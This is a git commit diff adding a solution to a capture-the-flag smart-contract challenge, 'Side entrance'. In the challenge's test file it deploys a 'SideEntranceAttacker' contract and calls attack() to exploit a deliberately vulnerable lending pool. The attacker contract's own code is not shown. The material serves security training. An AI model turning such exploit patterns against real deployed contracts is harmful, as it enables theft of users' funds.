c88889a46cee512664d837f578fe2b45145a0b9c
Katie <okdonga@gmail.com>
2023-02-06 16:04:06 +0900

    Update side-entrance.challenge.js

--- test/side-entrance/side-entrance.challenge.js
+++ test/side-entrance/side-entrance.challenge.js
@@ -25,6 +25,9 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const AttackerFactory = await ethers.getContractFactory('SideEntranceAttacker', deployer);
+        this.attacker = await AttackerFactory.deploy(this.pool.address);
+        this.attacker.connect(attacker).attack();
     });
 
     after(async function () {
